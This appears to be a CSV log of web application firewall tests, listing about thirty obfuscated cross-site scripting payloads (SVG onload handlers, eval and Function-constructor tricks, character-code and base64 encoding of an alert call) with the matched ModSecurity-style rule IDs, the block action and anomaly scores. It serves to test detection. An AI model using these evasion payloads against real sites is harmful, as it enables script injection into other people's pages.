1891,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='setTimeout(&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,121v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603499666.782729
1892,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='setInterval(&quot;al&quot;+&quot;ert(1)&quot;,1)'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,124v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603499784.169109
1895,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='self[String.fromCharCode(101,118,97,108)](&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,11,"934100,934100,941100,941120,941130,941140,941160,941170,941300,941370,949110","o99,19v217,189 || o99,19v217,189t:urlDecodeUni || v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,152v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o94,41v217,189t:urlDecodeUni,t:compressWhitespace || ",50,177603500033.825280
1897,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='eval.call(null,&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,162t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,162t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,162t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,125v217,162t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,162t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,162t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,162t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603500225.815989
1898,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='eval.apply(null,[&quot;al&quot;+&quot;ert(1)&quot;])'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,128v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603500432.249379
1900,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='(function(){eval(&quot;al&quot;+&quot;ert(1)&quot;)})();'></svg>""></object>",0,1,block,12,"932100,933160,934100,934100,941100,941120,941130,941140,941160,941170,941300,949110","o103,7v217,169 || o106,43v217,169 || o95,11v217,169 || o95,11v217,169t:urlDecodeUni || v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,132v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",55,177603500672.135621
1901,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='eval(/**/&quot;al&quot;+/**/&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,11,"933160,934100,934100,941100,941120,941130,941140,941160,941170,941300,949110","o94,47v217,160 || o94,5v217,160 || o94,5v217,160t:urlDecodeUni || v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,123v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",50,177603500762.814168
1902,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='eval(&quot;al&quot;.concat(&quot;ert(1)&quot;))'></svg>""></object>",0,1,block,10,"933160,934100,941100,941120,941130,941140,941160,941170,941300,949110","o94,47v217,160 || o94,5v217,160 || v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,123v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603500827.976022
1903,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='globalThis[&quot;ev&quot;+&quot;al&quot;](&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,132v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603501072.990600
1904,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='Array.prototype.constructor.constructor(&quot;al&quot;+&quot;ert(1)&quot;)()'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,152v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603501155.147610
1905,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='eval(&quot;al&quot;+String.fromCharCode(101,114,116,40,49,41))'></svg>""></object>",0,1,block,11,"933160,934100,934100,941100,941120,941130,941140,941160,941170,941300,949110","o94,62v217,175 || o94,5v217,175 || o94,5v217,175t:urlDecodeUni || v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,148v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,175t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",50,177603501212.529918
1906,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='(1,eval)(&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,119v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603501316.795589
1910,"<svg onload=""(function(){var c=[]['constructor']['constructor'];c('al'+'ert(1)')()})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o65,21v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,94 || o14,11v217,94t:urlDecodeUni || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603501844.126557
1911,"<svg onload=""(function(){var d=top['Stri\u006eg']['fromCha\u0072Code'];Function(d(97,108,101,114,116,40,49,41))()})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,125 || v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,18v217,125t:urlDecodeUni,t:compressWhitespace || ",25,177603501932.639010
1913,"<svg onload=""(function(){var f=this['Str'+'ing']['from'+'Char'+'Code'];(1,window['ev'+'al'])(f(97,108,101,114,116,40,49,41))})()""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o80,48v217,136t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,136 || o14,11v217,136t:urlDecodeUni || v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,17v217,136t:urlDecodeUni,t:compressWhitespace || ",35,177603502180.150480
1914,"<svg onload=""(function(){[]['fill']['constructor']('al\u0065rt(1)')()})()""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,60v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603502392.690227
1916,"<svg onload=""(function(){var h=String['fromChar'+'Code'];top['ev'+'al'](h(97,108,101,114,116,40,49,41))})()""></svg>",0,1,block,9,"932105,933210,934100,934100,941100,941120,941160,941370,949110","o56,4v217,115 || o60,47v217,115t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,115 || o14,11v217,115t:urlDecodeUni || v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o57,14v217,115t:urlDecodeUni,t:compressWhitespace || ",40,177603502597.549316
1918,"<svg onload=""(function(){var j=self['Str\x69ng']['from\x43harCode'];(1,eval)(j(97,108,101,114,116,40,49,41))})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,120 || v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,17v217,120t:urlDecodeUni,t:compressWhitespace || ",25,177603502766.241215
1919,"<svg onload=""(()=>{Function(window['String']['fromCharCode'](97,108,101,114,116,40,49,41))()})()""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o27,69v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,16v217,104t:urlDecodeUni,t:compressWhitespace || ",25,177603502976.981156
1920,"<svg onload=""(function(){var k=top['\u0053tring']['\u0066romCharCode'];setTimeout(k(97,108,101,114,116,40,49,41),0)})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,127 || v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,18v217,127t:urlDecodeUni,t:compressWhitespace || ",25,177603503044.380916
1922,"<svg onload=""(function(){var m=globalThis['Stri'+'ng']['fromChar'+'Code'];(0,globalThis['ev'+'al'])(m(97,108,101,114,116,40,49,41))})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o87,48v217,143t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,143 || o14,11v217,143t:urlDecodeUni || v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17760350336.409455
1924,"<svg onload=""(function(){var p=[]['constructor']['constructor']('retu'+'rn this')()['ev'+'al'];p(String['fromCharCode'](97,108,101,114,116,40,49,41))})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o31,122v217,161t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,161 || o14,11v217,161t:urlDecodeUni || v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,161t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603503543.139183
1926,"<svg onload=""(function(){const r=self['Str\x69ng']['fromCh\x61rCode'];[]['fill']['constructor'](r(97,108,101,114,116,40,49,41))()})()""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o70,63v217,141t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,141 || v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,17v217,141t:urlDecodeUni,t:compressWhitespace || ",30,177603503785.993374
1927,"<svg onload=""(function(){var b=atob;b('YWxlcnQoMSk=')['constructor']['constructor']('return this')()['eval'](b('YWxlcnQoMSk='))})()""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o53,78v217,139t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,139 || v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603503872.938103
1940,"<svg onload=""Function(`var${'\x20'}n=atob;eval(n('YWxlcnQoMSk='))`)()""></svg>",0,1,block,9,"932100,932130,933160,934100,941100,941120,941160,942100,949110","o41,5v217,77 || o25,6v217,77t:urlDecodeUni,t:cmdLine || o42,27v217,77 || o42,5v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,77 || ",40,177603505316.620303
1942,"<svg onload=""throw/**/new/**/Function('var q=atob;eval(q(\u0060YWxlcnQoMSk=\u0060))')()//""></svg>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o49,5v217,97 || o50,37v217,97 || o50,5v217,97 || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17760350564.598704
1945,"<svg onload=""+(function(){var t=window[`\u0061\u0074\u006f\u0062`];[][`constructor`][`constructor`](`return eval`)()(t(`YWxlcnQoMSk=`))})()""></svg>",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o15,11v217,147 || o15,11v217,147t:urlDecodeUni || v217,147t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,147t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,147t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,34v217,147t:urlDecodeUni,t:compressWhitespace || ",30,177603505984.384477
1946,"<svg onload=""~function(){var u=self['at'/**/+'ob'];Function('return eval')()((u('YWxlcnQoMSk=')))}()""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o55,41v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,108 || o14,11v217,108t:urlDecodeUni || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,13v217,108t:urlDecodeUni,t:compressWhitespace || ",35,17760350604.794187
1948,"<svg onload=""((new Function('\u0061l'+String.fromCharCode(101)+'r'+'\u0074(1)'))())""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o74,9v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,91 || o15,13v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603506242.657083
1949,"<svg onload=""((new Function('al'+String['fromCharCode'](101)+'r'+'t(1)'))())""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,63v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,84 || o15,13v217,84t:urlDecodeUni || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603506386.143411
1950,"<svg onload=""((new Function('al'+'\x65'+'r'+'t(1)'))())""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o46,9v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,63 || o15,13v217,63t:urlDecodeUni || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603506478.314640
1951,"<svg onload=""((new Function('al'+'ert'+'(1)'))())""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,36v217,57t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,57 || o15,13v217,57t:urlDecodeUni || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603506691.039499
